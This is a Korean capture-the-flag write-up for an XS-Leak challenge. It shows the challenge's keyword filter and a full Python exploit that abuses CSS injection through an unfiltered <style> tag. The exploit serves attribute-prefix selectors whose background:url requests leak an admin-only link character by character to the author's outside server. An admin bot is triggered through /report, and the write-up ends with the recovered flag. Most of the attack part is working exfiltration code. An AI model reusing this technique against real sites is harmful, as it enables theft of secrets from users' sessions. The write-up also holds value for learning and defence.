## XS-Leak

```python
vulns = ["javascript","script","frame","object","embed","on","data","base",
         "\\u","&#","alert","fetch","xmlhttprequest","eval","constructor"]
```

`<style>` 태그를 막지 않아 css injection이 가능함을 유추해 볼 수 있다. 또 admin이 글을 보면
`<a href="javascript:alert('FLAG')">` 가 렌더 된다는 정보가 있으므로 `[attr^=]` 구문과
`background:` 기능을 사용해 flag를 복원할 수 있을 것이다. 페이로드의 전체적인 과정은 다음과 같다.

로그인을 하고 `<style>@import` 로 내 서버의 CSS를 불러오는 글을 작성한 뒤, `/report` 로 해당 글을
admin이 방문하게 한다. 봇이 `/css` 를 받으면 **접두 일치하는 규칙 하나의 `background` 가 발동**해
그 글자가 내 `/leak` 서버로 유출된다. 접두부를 **한 글자씩 늘려 이 과정을 반복**하면 flag 전체를 복원할 수 있다.

```python
import re, time, threading
import urllib.parse as up
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import requests

BASE     = "http://edu.arang.kr:9106"
BOT_HOST = "edu.arang.kr:9106"
PUBLIC   = "https://starring-daniel-prizes-kick.trycloudflare.com"
PORT     = 8000
USER = PASSWD = "a"
CHARSET = []
for c in range(0x20, 0x7f):
    if c not in (0x22, 0x5c):
        CHARSET.append(chr(c))

flag = "flag{"
got  = threading.Event()


def make_css(p):
    rules = [
        f"a[href^=\"javascript:alert('{p}{ch}\"]{{background:url('{PUBLIC}/leak?c={up.quote(p + ch)}')}}"
        for ch in CHARSET
    ]
    return "\n".join(rules).encode()


class Handler(BaseHTTPRequestHandler):
    def log_message(self, *_): pass

    def do_GET(self):
        global flag
        req = up.urlparse(self.path)
        qs  = up.parse_qs(req.query)

        if req.path == "/css":
            body = make_css(qs.get("p", [flag])[0])
            self.send_response(200)
            self.send_header("Content-Type", "text/css")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        elif req.path == "/leak":
            leaked = up.unquote(qs.get("c", [""])[0])
            if leaked.startswith(flag) and len(leaked) > len(flag):
                flag = leaked[:len(flag) + 1]
                print(f"[+] {flag}")
                got.set()
            self.send_response(200)
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()


def my_last_seq(sess):
    html = sess.get(f"{BASE}/board", timeout=15).text
    seqs = [int(n) for n in re.findall(r'/board/(\d+)"', html)]
    return max(seqs) if seqs else None


def main():
    threading.Thread(target=lambda: ThreadingHTTPServer(("0.0.0.0", PORT), Handler).serve_forever(),
                     daemon=True).start()
    print(f"listening")

    sess = requests.Session()
    sess.post(f"{BASE}/login", data={"userid": USER, "userpw": PASSWD}, timeout=15)

    while not flag.endswith("}"):
        payload = f"<style>@import '{PUBLIC}/css?p={up.quote(flag)}';</style>"
        sess.post(f"{BASE}/write", data={"subject": "x", "content": payload}, timeout=15)

        seq = my_last_seq(sess)
        got.clear()
        sess.post(f"{BASE}/report", data={"url": f"http://{BOT_HOST}/board/{seq}"}, timeout=15)
        print(f"[*] report seq={seq}, prefix={flag!r}")

    print(f"\nFLAG = {flag}")


if __name__ == "__main__":
    main()
```

![](images/11.png)

`flag{c1a7abb092d8959e7b54}` 플래그를 획득할 수 있다.
